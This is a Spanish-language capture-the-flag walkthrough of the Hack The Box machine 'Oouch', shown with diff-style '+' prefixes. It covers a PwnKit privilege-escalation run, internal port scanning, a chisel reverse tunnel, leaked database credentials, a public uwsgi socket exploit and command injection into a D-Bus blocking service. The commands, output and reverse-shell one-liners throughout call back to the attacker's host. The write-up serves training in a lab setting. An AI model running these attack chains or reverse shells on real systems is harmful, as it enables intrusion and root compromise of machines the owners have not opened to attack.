+qtc@oouch:/tmp$ ./test.sh 
+██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
+██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+CVE-2021-4034 PoC by Kim Schulz
+[+] Setting up environment...
+[+] Build offensive gconv shared module...
+[+] Build mini executor...
+root@oouch:/tmp# cat /root/root.txt 
+cea3d0a51251d0e34eef0d7bf190875a 
+```
+
+# Escalada
+
+Hay una nota oculta
+
+```null
+qtc@oouch:~$ cat .note.txt 
+Implementing an IPS using DBus and iptables == Genius?
+```
+
+La máquina tiene varias interfaces
+
+```null
+qtc@oouch:/tmp$ hostname -I
+10.10.10.177 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:c54e 
+```
+
+Subo un binario estático de ```nmap``` para aplicar HostDiscovery
+
+```null
+qtc@oouch:/tmp$ ./nmap --min-rate 5000 -n -sn 172.17.0.1/24 172.18.0.1/24 --open 2>/dev/null 
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-16 11:55 CET
+Nmap scan report for 172.17.0.1
+Host is up (0.00021s latency).
+Nmap scan report for 172.18.0.1
+Host is up (0.00011s latency).
+Nmap scan report for 172.18.0.2
+Host is up (0.00031s latency).
+Nmap scan report for 172.18.0.3
+Host is up (0.00014s latency).
+Nmap scan report for 172.18.0.4
+Host is up (0.000086s latency).
+Nmap scan report for 172.18.0.5
+Host is up (0.000096s latency).
+Nmap done: 512 IP addresses (6 hosts up) scanned in 0.51 seconds
+```
+
+Escaneo todos los puertos
+
+```null
+qtc@oouch:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn $(./nmap --min-rate 5000 -n -sn 172.17.0.1/24 172.18.0.1/24 --open 2>/dev/null | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | grep 172 | xargs)
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-16 11:58 CET
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.17.0.1
+Host is up (0.00031s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+5000/tcp open  unknown
+8000/tcp open  unknown
+
+Nmap scan report for 172.18.0.1
+Host is up (0.00030s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+5000/tcp open  unknown
+8000/tcp open  unknown
+
+Nmap scan report for 172.18.0.2
+Host is up (0.00011s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+3306/tcp open  mysql
+
+Nmap scan report for 172.18.0.3
+Host is up (0.00017s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+3306/tcp open  mysql
+
+Nmap scan report for 172.18.0.4
+Host is up (0.00017s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+8000/tcp open  unknown
+
+Nmap scan report for 172.18.0.5
+Host is up (0.00018s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  unknown
+```
+
+Subo el ```chisel``` para poder tener conectividad con mi equipo
+
+Primero creo el servidor:
+
+```null
+chisel server -p 1234 --reverse
+```
+
+Desde la máquina víctima me conecto
+
+```null
+qtc@oouch:/tmp$ ./chisel client 10.10.16.11:1234 R:socks &>/dev/null & disown
+```
+
+En su directorio ```.ssh``` hay una clave pública en las authorized_keys
+
+```null
+authorized_keys  id_rsa
+qtc@oouch:~/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpC8e4oDWLbwPWV29VsUHw8vsBHEE3LxV7+F9b9XtyYQdMNMm2aTsslnNzV2Mgoqpgvx4HRltWlKYg0t8nbGcJuBEvKjloRuPVfD592v3/IrUh7nkpCOCeCE12Ct5l4NadN8Gtjyx3XyvAFCnEumGkJHfrsz0y7DorfW0mE2UjAq05bLmgOj87zxSeoipqIlVkUOkcn+7S5BzzOqp0dHUe1VVteIze7kz/q1veP3xHHuzCs0QK3ZbKuZiitguhO8Yrh+si9u/yW/O0bjxauwgTK9IQo2o1R+dEYVhQllQyuJ03mI7Jq9TuJjSWgyufbGKS5Wsh5RxdFuXN4XBNrGSQKFcqBh2dYez7XmqsOZlPNBiBqbHv68PXdxO5moqYeREUQ8N9r89eWgoiqLaMC1lVuCJWqdLQX7gHETZPfyr/8bnXeJHURe4/OHiNAgEYMJyKrlU2ze3S6f6B3kB7jR6wkp5Vyk+LWwoU7twXKFDwQwTYNuAzFwBkKPS/Kls55aU= pentester@kali
+```
+
+Me puedo conectar al contenedor ```172.18.0.5``` sin proporcinar contraseña
+
+```null
+qtc@oouch:/tmp$ ssh 172.18.0.5
+The authenticity of host '172.18.0.5 (172.18.0.5)' can't be established.
+ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.18.0.5' (ED25519) to the list of known hosts.
+Linux 5844366d8c1d 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+qtc@5844366d8c1d:~$ 
+```
+
+En la raíz hay un directorio ```/code```
+
+```null
+qtc@5844366d8c1d:/$ cd code/
+qtc@5844366d8c1d:/code$ ls
+Dockerfile  authorized_keys  config.py  consumer.py  key  migrations  nginx.conf  oouch  requirements.txt  start.sh  urls.txt  uwsgi.ini
+```
+
+Se filtran credenciales de acceso a la base de datos
+
+```null
+qtc@5844366d8c1d:/code$ cat config.py
+import os
+
+basedir = os.path.abspath(os.path.dirname(__file__))
+
+class Config(object):
+    # ...
+    SQLALCHEMY_DATABASE_URI = 'mysql://qtc:clarabibi2019!@database.consumer.oouch.htb/Consumer'
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+    SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
+```
+
+Me conecto desde mi equipo
+
+```null
+proxychains mysql -h 172.18.0.2 -uqtc -p'clarabibi2019!'
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 22
+Server version: 10.4.12-MariaDB-1:10.4.12+maria~bionic mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
+
+Dentro puedo ver los hashes del servicio web
+
+```null
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| Consumer           |
+| information_schema |
++--------------------+
+2 rows in set (0.227 sec)
+
+MariaDB [(none)]> use Consumer;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [Consumer]> show tables;
++--------------------+
+| Tables_in_Consumer |
++--------------------+
+| alembic_version    |
+| token              |
+| user               |
++--------------------+
+3 rows in set (0.374 sec)
+MariaDB [Consumer]> describe user;
++---------------+--------------+------+-----+---------+----------------+
+| Field         | Type         | Null | Key | Default | Extra          |
++---------------+--------------+------+-----+---------+----------------+
+| id            | int(11)      | NO   | PRI | NULL    | auto_increment |
+| username      | varchar(64)  | YES  | UNI | NULL    |                |
+| email         | varchar(120) | YES  | UNI | NULL    |                |
+| password_hash | varchar(128) | YES  |     | NULL    |                |
++---------------+--------------+------+-----+---------+----------------+
+4 rows in set (0.599 sec)
+
+MariaDB [Consumer]> select email,password_hash from user;
++------------------------+-----------------------------------------------------------------------------------------------+
+| email                  | password_hash                                                                                 |
++------------------------+-----------------------------------------------------------------------------------------------+
+| qtc@nonexistend.nonono | pbkdf2:sha256:50000$4vpkztRd$726baf7deb41e0b4d98f4c90d55012582d12e999a3dc15be25b5ca58da59bcba |
+| rubbx@rubbx.com        | pbkdf2:sha256:50000$nxYaEhVQ$aac9f66c861527e7129c54b01e98380b43fc099f913dc4fdb4e4b1965da84665 |
++------------------------+-----------------------------------------------------------------------------------------------+
+2 rows in set (0.301 sec)
+```
+
+Pero no se puede crackear. Como todo esto corresponde a la web que está corriendo por el puerto 5000, filtro por la palabra "Contact"
+
+```null
+qtc@5844366d8c1d:/code$ grep -r -i "Contact" 2>/dev/null | awk '{print $1}' FS=":" | sort -u
+Binary file oouch/__pycache__/forms.cpython-37.pyc matches
+Binary file oouch/__pycache__/routes.cpython-37.pyc matches
+oouch/forms.py
+oouch/routes.py
+oouch/templates/about.html
+oouch/templates/contact.html
+oouch/templates/documents.html
+oouch/templates/hacker.html
+oouch/templates/home.html
+oouch/templates/oauth.html
+oouch/templates/password_change.html
+oouch/templates/profile.html
+oouch/templates/qtc_documents.html
+```
+
+Inspecciono el ```routes.py```. Encuentro la función que me aplicaba el bloqueo cuando intentaba el XSS
+
+```null
+# First apply our primitive xss filter
+if primitive_xss.search(form.textfield.data):
+    bus = dbus.SystemBus()
+    block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+    block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+
+    client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
+    response = block_iface.Block(client_ip)
+    bus.close()
+    return render_template('hacker.html', title='Hacker')
+```
+
+Como se está empleando por detrás ```iptables```, en caso de que pudiera controlar mi IP, podría intentar inyectar un comando. De primeras recibo un error
+
+```null
+qtc@5844366d8c1d:/usr/lib/python3/dist-packages/dbus$ python3
+Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import dbus
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+ModuleNotFoundError: No module named 'dbus'
+>>> exit
+Use exit() or Ctrl-D (i.e. EOF) to exit
+>>> exit()
+qtc@5844366d8c1d:/usr/lib/python3/dist-packages/dbus$ cd ..
+qtc@5844366d8c1d:/usr/lib/python3/dist-packages$ python3
+Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import dbus
+>>> bus = dbus.SystemBus()
+>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+>>> client_ip = "10.10.16.11; ping -c 1 10.10.16.11; #"
+>>> response = block_iface.Block(client_ip)
+ERROR:dbus.proxies:Introspect error on :1.2:/htb/oouch/Block: dbus.exceptions.DBusException: org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type="method_call", sender=":1.478" (uid=1000 pid=18382 comm="python3 ") interface="org.freedesktop.DBus.Introspectable" member="Introspect" error name="(unset)" requested_reply="0" destination=":1.2" (uid=0 pid=1558 comm="/root/dbus-server ")
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+  File "/usr/lib/python3/dist-packages/dbus/proxies.py", line 70, in __call__
+    return self._proxy_method(*args, **keywords)
+  File "/usr/lib/python3/dist-packages/dbus/proxies.py", line 145, in __call__
+    **keywords)
+  File "/usr/lib/python3/dist-packages/dbus/connection.py", line 651, in call_blocking
+    message, timeout)
+dbus.exceptions.DBusException: org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules; type="method_call", sender=":1.478" (uid=1000 pid=18382 comm="python3 ") interface="htb.oouch.Block" member="Block" error name="(unset)" requested_reply="0" destination=":1.2" (uid=0 pid=1558 comm="/root/dbus-server ")
+```
+
+En la configuración de ```nginx``` se puede ver como está montado
+
+```null
+qtc@5844366d8c1d:/etc/nginx$ cat nginx.conf 
+user www-data;
+worker_processes auto;
+
+pid /run/nginx.pid;
+
+events {
+    worker_connections 1024;
+    use epoll;
+    multi_accept on;
+}
+
+http {
+    access_log /dev/stdout;
+    error_log /dev/stdout;
+    sendfile            on;
+    tcp_nopush          on;
+    tcp_nodelay         on;
+    keepalive_timeout   65;
+    types_hash_max_size 2048;
+    include             /etc/nginx/mime.types;
+    default_type        application/octet-stream;
+    index   index.html index.htm;
+    server {
+        listen       5000 default_server;
+        server_name  consumer.oouch.htb;
+        root         /var/www/html;
+        location / {
+            include uwsgi_params;
+            uwsgi_pass unix:/tmp/uwsgi.socket;
+        }
+    }
+```
+
+Se está importando un unix socket file, que existe y tengo capacidad de lectura y es SUID como propietario ```www-data```, por lo que es bastante probable que este usuario si que disponga del privilegio de ejecutar comandos a través del ```dbus```
+
+```null
+qtc@5844366d8c1d:/etc/nginx$ ls -l /tmp/uwsgi.socket
+srw-rw-rw- 1 www-data www-data 0 Mar 16 09:00 /tmp/uwsgi.socket
+```
+
+Es vulnerable a una ejecución remota de comandos. El exploit está disponible en [Github](https://github.com/wofeiwo/webcgi-exploits/tree/master/python). Al ejecutarlo recibo un error de requerimientos
+
+```null
+qtc@5844366d8c1d:/tmp$ python3 exploit.py -m unix -u /tmp/uwsgi.socket -c "ping -c 1 10.10.16.11"
+[*]Sending payload.
+Traceback (most recent call last):
+  File "exploit.py", line 146, in <module>
+    main()
+  File "exploit.py", line 143, in main
+    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
+  File "exploit.py", line 110, in curl
+    return ask_uwsgi(addr_and_port, mode, var)
+  File "exploit.py", line 77, in ask_uwsgi
+    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
+  File "exploit.py", line 26, in pack_uwsgi_vars
+    pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
+  File "exploit.py", line 18, in sz
+    if sys.version_info[0] == 3: import bytes
+ModuleNotFoundError: No module named 'bytes'
+```
+
+Como no es del todo necesario, elimino aquellas líneas que lo importan
+
+```null
+qtc@5844366d8c1d:/tmp$ cat exploit.py | sed '/import bytes/d' | > exploit2.py
+qtc@5844366d8c1d:/tmp$ rm exploit.py 
+qtc@5844366d8c1d:/tmp$ mv exploit2.py exploit.py 
+```
+
+Ahora no hay problema
+
+```null
+qtc@5844366d8c1d:/tmp$ python3 exploit.py -m unix -u /tmp/uwsgi.socket -c "bash -c 'bash -i >& /dev/tcp/10.10.16.11/443 0>&1'"
+[*]Sending payload.
+```
+
+```null
+c -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.10.10.177] 54106
+bash: cannot set terminal process group (159): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+www-data@5844366d8c1d:/code$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+bash: /root/.bashrc: Permission denied
+www-data@5844366d8c1d:/code$ ^Z
+zsh: suspended  nc -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+www-data@5844366d8c1d:/code$ export TERM=xterm
+www-data@5844366d8c1d:/code$ export SHELL=bash
+www-data@5844366d8c1d:/code$ stty rows 55 columns 209
+```
+
+Puedo realizar la operación a la que antes no tenía acceso
+
+```null
+www-data@5844366d8c1d:/usr/lib/python3/dist-packages$ python3
+Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import dbus
+>>> bus = dbus.SystemBus()
+>>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+>>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+>>> client_ip = "10.10.16.11; ping -c 1 10.10.16.11; #"
+>>> response = block_iface.Block(client_ip)
+```
+
+```null
+ tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+12:13:20.010614 IP 10.10.10.177 > 10.10.16.11: ICMP echo request, id 18593, seq 1, length 64
+12:13:20.018945 IP 10.10.16.11 > 10.10.10.177: ICMP echo reply, id 18593, seq 1, length 64
+```
+
+Me envío una reverse shell
+
+```null
+>>> client_ip = "10.10.16.11; bash -c 'bash -i >& /dev/tcp/10.10.16.11/443 0>&1'; #"
+>>> response = block_iface.Block(client_ip)
+```
+
+Gano acceso como ```root``` y puedo ver la segunda flag
+
+```null
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.11] from (UNKNOWN) [10.10.10.177] 59438
+bash: cannot set terminal process group (1558): Inappropriate ioctl for device
+bash: no job control in this shell
+root@oouch:/root# cat /root/root.txt
+cat /root/root.txt
+cea3d0a51251d0e34eef0d7bf190875a
+```
